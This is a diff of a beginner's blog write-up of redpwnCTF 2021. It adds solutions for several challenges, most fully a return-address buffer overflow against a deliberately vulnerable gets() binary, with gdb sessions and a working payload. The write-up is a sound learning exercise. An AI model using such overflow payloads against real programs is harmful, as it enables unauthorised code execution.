@@ -2,11 +2,11 @@
 [meta]: <subtitle> (A noob's perspective)
 [meta]: <author> (Loek)
 [meta]: <date> (July 13 2021)
-[meta]: <tags> (hacking, CTF)
+[meta]: <tags> (hacking, CTF, writeup)
 [meta]: <cover> (/img/redpwn2021.png)
 
 This is the first 'real' CTF I've participated in. About two weeks ago, a
-friend of mine was stuck on some challenges from the Radbout CTF. This was a
+friend of mine was stuck on some challenges from the Radboud CTF. This was a
 closed CTF more geared towards beginners (high school students), and only had a
 few challenges which required deeper technical knowledge of web servers and
 programming. Willem solved most of the challenges, and I helped solve 3 more.
@@ -14,7 +14,9 @@ programming. Willem solved most of the challenges, and I helped solve 3 more.
 Apart from those challenges, basically all my hacking knowledge comes from
 computerphile videos, liveoverflow videos and making applications myself.
 
-## web/pastebin-1
+## Challenges
+
+### web/pastebin-1
 
 This challenge is a simple XSS exploit. The website that's vulnerable is
 supposed to be a clone of pastebin. I can enter any text into the paste area,
@@ -45,7 +47,7 @@ Combining these two a simple paste can be created:
 </script>
 ```
 
-## crypto/scissor
+### crypto/scissor
 
 I wasn't planning on including this one, but it makes use of the excellent
 [CyberChef](https://gchq.github.io/CyberChef/) tool. The flag is given in the
@@ -53,7 +55,7 @@ challenge description, and is encrypted using a ceasar/rot13 cipher. A simple
 python implementation of this cypher is included with the challenge, but I just
 put it into CyberChef and started trying different offsets.
 
-## rev/wstrings
+### rev/wstrings
 
 > Some strings are wider than normal...
 
@@ -97,7 +99,7 @@ I think 32-bit strings also have practical use for things like non-english
 texts such as hebrew, chinese or japanese. Those characters take up more space
 anyways, and you would waste less space by not using unicode escape characters.
 
-## web/secure
+### web/secure
 
 > Just learned about encryption—now, my website is unhackable!
 
@@ -148,7 +150,7 @@ urldecode $(curl -sX POST \
 	https://secure.mc.ax/login)
 ```
 
-## crypto/baby
+### crypto/baby
 
 > I want to do an RSA!
 
@@ -162,7 +164,7 @@ stackoverflow result, which links to
 calculate `p` and `q`, which can be done using [wolfram
 alpha](https://wolframalpha.com/).
 
-## pwn/beginner-generic-pwn-number-0
+### pwn/beginner-generic-pwn-number-0
 
 > rob keeps making me write beginner pwn! i'll show him...
 >
@@ -394,14 +396,291 @@ detail about, but here's what is does (in short):
 The code for this script can be found
 [here](https://github.com/lonkaars/redpwn/blob/master/challenges/generic/pwn.py),
 though be warned, it's _very_ janky and you're probably better off copying
-stuff from stackoverflow.
+stuff from stackoverflow. Writing your own tools is more fun though, and might
+also be faster than trying to wrestle with existing tools to try to get them to
+do exactly what you want them to do. In this case I could've also just used [a
+siple
+command](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?noredirect=1&lq=1).
 
 It did help me though and I actually had to copy it for use in the other buffer
 overflow challenge that I solved, so I'll probably refactor it someday for use
 in other CTFs.
 
-## crypto/round-the-bases
+### crypto/round-the-bases
 
-## pwn/ret2generic-flag-reader
+This crypto challenge uses a text file with some hidden information. If you
+open up the file in a text editor, and adjust your window width, you'll
+eventually see the repeating pattern line up. This makes it very easy to see
+what part of the pattern is actually changing:
 
-## rev/bread-making
+```
+----------------------xxxx----
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+```
+
+I wrote a simple python script to parse this into binary data, and it worked on
+the first try:
+
+```py
+# read the file into a string
+file = open("./round-the-bases")
+content = file.read()
+file.close()
+
+# split on every 30th character into a list
+n = 30
+arr = [ content[i : i + n] for i in range(0, len(content), n) ]
+
+bin = []
+for line in arr:
+  sub = line[16:20] # the part that changes
+  if sub == 'IIcu': # IIcu -> 0x0
+    bin.append('0')
+  else: #             K0o0 -> 0x1
+    bin.append('1')
+
+bin = ''.join(bin) # join all the list indices together into a string
+
+# decode the binary string into ascii characters
+for i in range(0, len(bin), 8):
+  print(chr(int(bin[i:i+8], 2)), end='')
+
+# newline for good measure
+print("\n", end='')
+```
+
+### pwn/ret2generic-flag-reader
+
+This was the second binary exploitation challenge I tackled, and it went much
+better than the first because I (sort of) knew what I was doing by now.
+
+I figured the 'ret2' part of the title challenge was short for 'return to', and
+my suspicion was confirmed after looking at the c source:
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void super_generic_flag_reading_function_please_ret_to_me()
+{
+  char flag[0x100] = {0};
+  FILE *fp = fopen("./flag.txt", "r");
+  if (!fp)
+  {
+    puts("no flag!! contact a member of rob inc");
+    exit(-1);
+  }
+  fgets(flag, 0xff, fp);
+  puts(flag);
+  fclose(fp);
+}
+
+int main(void)
+{
+  char comments_and_concerns[32];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
+  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
+  puts("slap on some flavortext and there's no way rob will fire me now!");
+  puts("this is genius!! what do you think?");
+
+  gets(comments_and_concerns);
+}
+
+```
+
+With my newfound knowledge of binary exploitation, I figured I would have to
+overwrite the return pointer on the stack somehow, so the program calls the
+`super_generic_flag_reading_function_please_ret_to_me` function that isn't
+called at all in the original.
+
+The only input we have control over is again a call to `gets();`
+
+Let's look at the dissassembly in gdb:
+
+```
+(gdb) disas main
+Dump of assembler code for function main:
+   0x00000000004013f4 <+79>:    call   0x4010a0 <puts@plt>
+   0x00000000004013f9 <+84>:    lea    rdi,[rip+0xca0]        # 0x4020a0
+   0x0000000000401400 <+91>:    call   0x4010a0 <puts@plt>
+   0x0000000000401405 <+96>:    lea    rdi,[rip+0xd0c]        # 0x402118
+   0x000000000040140c <+103>:   call   0x4010a0 <puts@plt>
+   0x0000000000401411 <+108>:   lea    rdi,[rip+0xd48]        # 0x402160
+   0x0000000000401418 <+115>:   call   0x4010a0 <puts@plt>
+   0x000000000040141d <+120>:   lea    rax,[rbp-0x20]
+   0x0000000000401421 <+124>:   mov    rdi,rax
+   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt>
+   0x0000000000401429 <+132>:   mov    eax,0x0
+   0x000000000040142e <+137>:   leave
+   0x000000000040142f <+138>:   ret
+End of assembler dump.
+```
+
+We see again multiple calls to `<puts@plt>` and right after a call to
+`<gets@plt>`. There is no `cmp` and `jne` to be found in this challenge though.
+
+The goal is to overwrite the _return adress_. This is a memory adress also
+stored in memory, and the program will move execution to that memory adress
+once it sees a `ret` instruction. In this 'vanilla' state, the return adress
+always goes to the assembly equivalent of an `exit()` function. Let's see if we
+can overwrite it by giving too much input:
+
+```
+(gdb) break *0x000000000040142f
+Breakpoint 1 at 0x40142f
+(gdb) run < <(python3 -c "print('a' * 56)")
+-- Breakpoint 1 hit --
+(gdb) info registers
+rax            0x0                 0x0
+rbx            0x401430            0x401430
+rsi            0x7ffff7f7d883      0x7ffff7f7d883
+rdi            0x7ffff7f804e0      0x7ffff7f804e0
+rbp            0x6161616161616161  0x6161616161616161
+rsp            0x7fffffffd898      0x7fffffffd898
+rip            0x40142f            0x40142f <main+138>
+```
+
+As you can see, the $rbp register is completely overwritten with `0x61`'s.
+Let's check the $rsp register to see where the `main()` function tries to go
+after `ret`:
+
+```
+(gdb) run
+Starting program: ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3
+-- Breakpoint 1 hit --
+(gdb) x/1gx $rsp
+0x7fffffffd898: 0x3363326331633063
+```
+
+Let's use cyberchef to see what `0x3363326331633063` is in ascii!
+
+![](/img/redpwn2021/cyberchef1.png)
+
+Hmm, it's backwards. Let's reverse it!
+
+![](/img/redpwn2021/cyberchef2.png)
+
+Let's find the adress of the super generic flag reading function with gdb.
+
+```
+(gdb) print super_generic_flag_reading_function_please_ret_to_me
+$2 = {<text variable, no debug info>} 0x4011f6 <super_generic_flag_reading_function_please_ret_to_me>
+```
+
+Now we're ready to craft a string that exploits the program and runs the secret
+function!
+
+```
+a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3 <- original
+                                        c0c1c2c3 <- ends up in $rsp
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa         <- padding ( 0x28 * 'a' )
+
+  c 0 c 1 c 2 c 3  <- ends up in $rsp
+  3 c 2 c 1 c 0 c  <- reverse
+0x3363326331633063 <- reverse (hex)
+0x00000000004011f6 <- pointer we want in $rsp
+  f611400000000000 <- reverse
+  \xf6\x11\x40\x00\x00\x00\x00\x00 <- python bytestring
+
+exploit string:
+b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'
+```
+
+Now let's try it in an environment-less shell:
+
+```
+python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00')" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+flag{this_is_a_dummy_flag_go_solve_it_yourself}
+
+Segmentation fault (core dumped)
+sh-5.1$
+```
+
+### rev/bread-making
+
+For this challenge, I first tried using iaito again to do some program flow
+analysis. After giving up on that, I decided to instead brute-force the correct
+steps by hand. This was a very long and boring process.
+
+First I used `strings` again to extract all the dialogue and user input strings
+from the binary. Then I filtered them to not include obvious dialogue, but only
+the possible user input strings. And this is the correct path that gives the
+flag:
+
+```
+add flour
+add salt
+add yeast
+add water
+hide the bowl inside a box
+wait 3 hours
+work in the basement
+preheat the toaster oven
+set a timer on your phone
+watch the bread bake
+pull the tray out with a towel
+open the window
+unplug the oven
+unplug the fire alarm
+wash the sink
+clean the counters
+flush the bread down the toilet
+get ready to sleep
+close the window
+replace the fire alarm
+brush teeth and go to bed
+```
+
+In hindsight I could've probably made a simple python script to brute force all
+remaining possibilities until it got longer output from the program, but
+laziness took over and I decided that spending 45 minutes doing very dull work
+was more worth it instead.
+
+## Epilogue
+
+Of the 47 total challenges, me and Willem only solved 15. My end goal for this
+CTF wasn't winning to begin with, so the outcome didn't matter for me. After
+the second day I set the goal of reaching the 3rd page of the leaderboards as
+my goal, and we reached 277'th place in the end which made my mom very proud!
+
+![](/img/redpwn2021/leaderboard.png)
+
+I enjoyed the CTF a lot! There were some very frustrating challenges, and I
+still don't get how people solved web/wtjs, but that's fine. I did learn how to
+use GDB and a lot of other things during the CTF which were all very rewarding.
+I will definitely be participating in the 2022 redpwnCTF, and maybe even some
+others if they're beginner friendly :)
+
+During the Radboud CTF and this CTF I've accumulated a lot of ideas to maybe
+host one myself, though I have no clue where to start with that. Maybe keep an
+eye out for that ;)
+
